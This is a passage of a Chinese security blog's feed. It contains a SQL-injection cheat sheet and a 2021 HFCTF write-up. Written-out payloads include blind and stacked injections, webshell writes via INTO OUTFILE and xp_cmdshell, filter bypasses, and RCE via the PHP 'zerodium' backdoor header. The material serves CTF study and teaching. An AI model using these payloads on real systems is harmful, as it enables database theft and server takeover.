class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> multipoint<span class="operator">*</span><span class="operator">*</span>((<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>())<span class="operator">*</span><span class="operator">*</span>a<span class="operator">*</span><span class="operator">*</span>)<span class="operator">*</span><span class="operator">*</span>b<span class="operator">*</span><span class="operator">*</span>))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a><strong>polygon()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> polygon<span class="operator">*</span><span class="operator">*</span>((<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>())<span class="operator">*</span><span class="operator">*</span>a<span class="operator">*</span><span class="operator">*</span>)<span class="operator">*</span><span class="operator">*</span>b<span class="operator">*</span><span class="operator">*</span>))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a><strong>multipolygon()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> multipolygon<span class="operator">*</span><span class="operator">*</span>((<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>())<span class="operator">*</span><span class="operator">*</span>a<span class="operator">*</span><span class="operator">*</span>)<span class="operator">*</span><span class="operator">*</span>b<span class="operator">*</span><span class="operator">*</span>))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a><strong>linestring()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> linestring<span class="operator">*</span><span class="operator">*</span>((<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>())<span class="operator">*</span><span class="operator">*</span>a<span class="operator">*</span><span class="operator">*</span>)<span class="operator">*</span><span class="operator">*</span>b<span class="operator">*</span><span class="operator">*</span>))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a><strong>multilinestring()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> multilinestring<span class="operator">*</span><span class="operator">*</span>((<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>())<span class="operator">*</span><span class="operator">*</span>a<span class="operator">*</span><span class="operator">*</span>)<span class="operator">*</span><span class="operator">*</span>b<span class="operator">*</span><span class="operator">*</span>))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a><strong>exp()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> exp<span class="operator">*</span><span class="operator">*</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>())<span class="operator">*</span><span class="operator">*</span>a<span class="operator">*</span><span class="operator">*</span>))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>在boolean注入无回显时，使用次方法来判断是否成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">基于sleep的延迟 </span><br><span class="line">xx<span class="string">&#x27; or if(length((select database()))&gt;1,sleep(5),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">笛卡尔乘积运算时间造成的时间延迟</span></span><br><span class="line"><span class="string">xx&#x27;</span> <span class="keyword">or</span> if(length((<span class="keyword">select</span> database()))<span class="operator">&gt;</span><span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A,information_schema.columns p B,information_schema.columns C),<span class="number">1</span>) # </span><br><span class="line"></span><br><span class="line">基于benchmark的延迟 </span><br><span class="line">xx<span class="string">&#x27;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#x27;</span>a<span class="string">&#x27;))),1) #--大概会用2S时间</span></span><br></pre></td></tr></table></figure><p><strong>一般流程</strong></p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>,<span class="number">1</span>,sleep(<span class="number">3</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line">使用二分法，一步一步爆出数据库名，假设其中有一数据库名为flag</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’flag’ limit <span class="number">1</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span></span><br><span class="line">假设有一表名为flagtable</span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>’flagtable’ limit <span class="number">1</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span>，</span><br><span class="line">假设爆出列名为name和password</span><br></pre></td></tr></table></figure><p>爆表中的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> group_concat(name,password) <span class="keyword">from</span> flag.flagtable limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">48</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p><strong>利用handler</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27;;select if(sub(user(),1,1)=&#x27;</span>r<span class="string">&#x27;,sleep(3),1)%23</span></span><br></pre></td></tr></table></figure><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><p>基本形式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>其中  HANDLER tbl_name <span class="keyword">OPEN</span> <span class="keyword">AS</span> example</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>其后  HANDLER example READ index_name<span class="operator">=</span>&quot;example2&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png"></p><p><strong>利用rename</strong></p><p>以强网杯随便注为例</p><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table  `1919810931114514` to words; alert table words </span></span><br><span class="line"><span class="string">add id int unsigned not Null auto_increment primary key ; alert table words change flag data </span></span><br><span class="line"><span class="string">varchar(100); #</span></span><br></pre></td></tr></table></figure><p>具体思路为将需要获得的数据的表、列等名字修改为目前可以查询到的表和列的名字，需要注意的是，在修改需要获得数据的表、列的名字前，需要先将目前可以查询到的表和名字先进行修改，然后在利用页面本来就有的查询功能查询敏感数据。</p><p><strong>利用execute</strong></p><p>同距离19强网杯的随便注</p><p>execute用来执行由SQLPrepare创建的SQL语句。</p><p>将select * from <code>1919810931114514</code>进行16进制编码</p><p>再构造出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure><p>prepare…from…是预处理语句，会进行编码转换。利用这个来让语句进行解码</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>把非法代码写入数据库（利用‘\’进行转义写入），然后在其他地方调用这个数据拼接成为非法代码写入sql语句中</p><p>简单的逻辑如下</p><p>非法代码转义 —存入—&gt;数据库—取出—&gt;后台变量中—拼接—&gt;组成非法语句</p><h3 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h3><p>举例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="comment">/*!UNION*/</span> <span class="comment">/*!SELECT*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><p>利用别名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,a.id,b.id,<span class="operator">*</span> <span class="keyword">from</span>(sys_admin <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> sys_admin <span class="keyword">as</span> b <span class="keyword">on</span> a.id<span class="operator">=</span>b.id)</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select &#x27;</span><span class="operator">&lt;</span>?php <span class="variable">@eval</span>($_POST[<span class="number">1</span>]);?<span class="operator">&gt;</span><span class="string">&#x27; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">404.</span>php<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure><p>也可使用dumpfile进行写入。</p><p><strong>outfile和dumpfile的区别：</strong></p><p>outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。dumpfile只能执行一行数据。</p><p>数据库写入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;echo &quot;&lt;%eXECutegLobaL rEquEst(0)%&gt;&quot; &gt; &quot;c:www\uploadFiles2019-11404.asp&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="利用查询不存在用户时虚构用户进行注入"><a href="#利用查询不存在用户时虚构用户进行注入" class="headerlink" title="利用查询不存在用户时虚构用户进行注入"></a>利用查询不存在用户时虚构用户进行注入</h3><p>mysql在查询不存在的数据时，会自动构建虚拟数据</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png"></p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png"></p><p>可以看到表自动加上了一个用户</p><p>我们可以用这个来进行登录进去admin账户等用途</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="关键字嵌套，大小写绕过"><a href="#关键字嵌套，大小写绕过" class="headerlink" title="关键字嵌套，大小写绕过"></a>关键字嵌套，大小写绕过</h3><p>union=⇒UNiunionoN</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>URL编码 #→%23</p><p>16进制编码 users→0x7573657273</p><p>ASCII编码</p><p>Unicode编码</p><p>双重编码</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>末尾注释：#,%23,-,—+</p><p>/<strong>/注释可以用于代替空格，%0b代替/</strong>/</p><p>内联注释/<em>!要执行的code</em>/例如:id=1/<em>!UnIoN</em>/SeLeCT</p><p>’ 和 “ 注释，用于闭合SQL语句中的引号</p><h3 id="关键字替换"><a href="#关键字替换" class="headerlink" title="关键字替换"></a>关键字替换</h3><p>空格替换：/**/，%a0，（）</p><p>and替换：&amp;&amp;</p><p>or替换：||</p><p>=替换：&lt;，&gt;，like , rlike</p><p>引号替换：用16进制编码</p><h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：<br>？id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　<br>或者：<br>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1</p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a><strong>特殊符号</strong></h3><p>反引号，select <code>version()</code>，绕过空格和正则加号和点，”+”和”.”代表连接，也可绕过空格和关键字过滤@符号，用于定义变量，一个@代表用户变量，@@代表系统变量</p><h3 id="关键字拆分"><a href="#关键字拆分" class="headerlink" title="关键字拆分"></a>关键字拆分</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;se&#x27;</span><span class="operator">+</span><span class="string">&#x27;lec&#x27;</span><span class="operator">+</span><span class="string">&#x27;t&#x27;</span><span class="operator">%</span>S<span class="operator">%</span>E<span class="operator">%</span>L<span class="operator">%</span>C<span class="operator">%</span>T <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">EXEC</span>(<span class="string">&#x27;ma&#x27;</span><span class="operator">+</span><span class="string">&#x27;ster..x&#x27;</span><span class="operator">+</span><span class="string">&#x27;p_cm&#x27;</span><span class="operator">+</span><span class="string">&#x27;dsh&#x27;</span><span class="operator">+</span><span class="string">&#x27;ell&quot;net user&quot;&#x27;</span>)<span class="operator">!</span>和()：<span class="string">&#x27;or--+2=--!!!&#x27;</span><span class="number">2</span>id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span>(UnI)(<span class="keyword">oN</span>)<span class="operator">+</span>(SeL)(EcT)</span><br></pre></td></tr></table></figure><h3 id="加括号绕过"><a href="#加括号绕过" class="headerlink" title="加括号绕过"></a><strong>加括号绕过</strong></h3><p><strong>小括号</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> (<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users)<span class="operator">%</span><span class="number">23</span><span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),(<span class="number">2</span>),(<span class="number">3</span>)<span class="keyword">from</span>(users))id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">or</span>(<span class="number">0x50</span><span class="operator">=</span><span class="number">0x50</span>)id<span class="operator">=</span>(<span class="number">-1</span>)<span class="keyword">union</span>(((((((<span class="keyword">select</span>(<span class="number">1</span>),hex(<span class="number">2</span>),hex(<span class="number">3</span>)<span class="keyword">from</span>(users))))))))</span><br></pre></td></tr></table></figure><p><strong>花括号</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#123;x user&#125;from&#123;x mysql.user&#125;id=-1 union select 1,&#123;x 2&#125;,3</span><br></pre></td></tr></table></figure><h2 id="其他trick"><a href="#其他trick" class="headerlink" title="其他trick"></a>其他trick</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>　　　　　　　　<span class="operator">/</span><span class="operator">/</span>完整语句 <span class="keyword">select</span> username,age <span class="keyword">from</span> userinfo <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#x27; or 1=1#　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27; or 1=1#&#x27;</span></span><br><span class="line"><span class="string">&#x27;=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27;=0#</span></span><br></pre></td></tr></table></figure><h3 id="判断三种数据库的语句"><a href="#判断三种数据库的语句" class="headerlink" title="判断三种数据库的语句"></a><strong>判断三种数据库的语句</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL：<span class="keyword">and</span> length(<span class="keyword">user</span>())<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line">ACCESS：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span> MSysAccessObjects)<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line">MSSQL：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span> sysobjects)<span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>表名，列名为数字时，要使用``反引号括起来，例如<code>1231818</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sql注入总结&quot;&gt;&lt;a href=&quot;#sql注入总结&quot; class=&quot;headerlink&quot; title=&quot;sql注入总结&quot;&gt;&lt;/a&gt;sql注入总结&lt;/h1&gt;&lt;h1 id=&quot;0x00注入原理&quot;&gt;&lt;a href=&quot;#0x00注入原理&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="web" scheme="http://fxizenta.github.io/categories/web/"/>
    
    
    <category term="sql" scheme="http://fxizenta.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>2021hfctf_wp</title>
    <link href="http://fxizenta.github.io/2021/04/06/2021hfctf-wp/"/>
    <id>http://fxizenta.github.io/2021/04/06/2021hfctf-wp/</id>
    <published>2021-04-06T11:52:50.000Z</published>
    <updated>2021-04-06T12:00:24.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021hfctf-wp"><a href="#2021hfctf-wp" class="headerlink" title="2021hfctf wp"></a>2021hfctf wp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>前段时间php git仓库被上传的恶意代码的利用RCE</p><p>去github上看看恶意代码段</p><p>有点小坑的是后面还有一个t</p><p>User-Agentt:zerodiumsystem(“cat /flag”);</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><p>代码百度一下发现是fatfree框架</p><p>下源码下来看一下</p><p>发现代码利用段如下</p><p><img src="https://i.loli.net/2021/04/06/UbaAjcunLsKoQyX.png" alt="unsetme"></p><p>构造payload?a=b&amp;a=b%0a,$abc);system(“cat /flag”</p><h2 id="慢慢来数据库"><a href="#慢慢来数据库" class="headerlink" title="慢慢来数据库"></a>慢慢来数据库</h2><p>这题是真的有毒。。</p><p>根据提示</p><p>index.php的md5注入绕过，password填129581926211651571912466741651878684928即可<br>ssrf访问127.0.0.1/admin.php<br>然后堆叠注入，这里应该是强网杯随便注的魔改</p><p>发现2个库，找到库 ctf2 里2个表</p><p>看一下2个表的字段<br>real_admin_here_do_you_find里是id,username,password<br>fake_admin是id,username,fake_password<br>页面默认select的是fake_admin，用改名的方法来查真的密码</p><p>这里用的是RENAME</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1;use ctf2;RENAME TABLE `fake_admin` TO `fake_admin1`;RENAME TABLE</span></span><br><span class="line"><span class="string">`real_admin_here_do_you_find` TO `fake_admin`; --</span></span><br></pre></td></tr></table></figure><p>然后用 ‘or 1=1 注入查密码</p><p>最后ssrf看admin.php出flag</p><p>查的用户名是admin_inner最后用的是admin也是没谁了</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="你会日志吗？"><a href="#你会日志吗？" class="headerlink" title="你会日志吗？"></a>你会日志吗？</h2><p>时间盲注的日志，找377然后ASSIC转，发现是base64 ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==</p><p>解码出flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021hfctf-wp&quot;&gt;&lt;a href=&quot;#2021hfctf-wp&quot; class=&quot;headerlink&quot; title=&quot;2021hfctf wp&quot;&gt;&lt;/a&gt;2021hfctf wp&lt;/h1&gt;&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class</summary>
      
    
    
    
    <category term="web" scheme="http://fxizenta.github.io/categories/web/"/>
    
    
    <category term="wp" scheme="http://fxizenta.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式学习总结</title>
    <link href="http://fxizenta.github.io/2021/03/06/regular_expression/"/>
    <id>http://fxizenta.github.io/2021/03/06/regular_expression/</id>
    <published>2021-03-06T04:24:46.000Z</published>
    <updated>2021-03-07T04:55:56.417Z</updated>
    
